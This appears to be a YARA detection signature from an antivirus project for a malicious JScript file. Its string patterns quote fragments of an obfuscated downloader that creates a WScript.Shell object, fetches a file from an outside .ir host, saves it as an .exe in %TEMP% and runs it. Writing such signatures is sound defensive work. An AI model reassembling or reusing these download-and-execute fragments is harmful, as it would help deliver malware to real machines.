rule sig_20160330_59b26e6311dabfe9d711f2a61b81af9f {
  meta:
    description = "datamaliciousorder - file 20160330_59b26e6311dabfe9d711f2a61b81af9f.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "c24fd931f4132818b82058e63acbfd52b4793a892dca201e359dfb85f7622be6"

  strings:
    $s1  = "var _T = function _X() {return WScript[_FF](\"WScript\"+\".Shell\");}(), _Q = 11;" fullword ascii
    $s2  = "function _R(_I0, _QD){_MW = _MW * 1; return _I0 - _QD;};" fullword ascii
    $s3  = "if (_A1[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s4  = "function _JB(){return _NK + \"\";};" fullword ascii
    $s5  = "function _PM() {return _T[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"sZfZv79xmq2Ewf7I.ex\" + \"e\";};" fullword ascii
    $s6  = "_A1[_D](\"GET\", \"http://topcarshop.ir/m1kas\", false);" fullword ascii
    $s7  = "function _PW(_Y){_T[\"Run\"](_Y, _MW, _MW);};" fullword ascii
    $s8  = "function _RS() {return ((_ZN == true) && (_ZN == _G)) ? 1 : _MW;};" fullword ascii
    $s9  = "function _CX(){return _FF;};" fullword ascii
    $s10 = " while (_AM){" fullword ascii
    $s11 = "return _R(_A0, _A);" fullword ascii
    $s12 = "function _RA()" fullword ascii
    $s13 = "var _GP = new this[\"Date\"]();" fullword ascii
    $s14 = "function _I(){return 22;};" fullword ascii
    $s15 = "function _IC(_D0) {var _O = (1, 2, 3, 4, 5, _D0); return _O;};" fullword ascii
    $s16 = "var _G = false;" fullword ascii
    $s17 = "_G = true; " fullword ascii
    $s18 = "var _ZN = false;" fullword ascii
    $s19 = "_ZN = true; " fullword ascii
    $s20 = "var _UX = false;" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}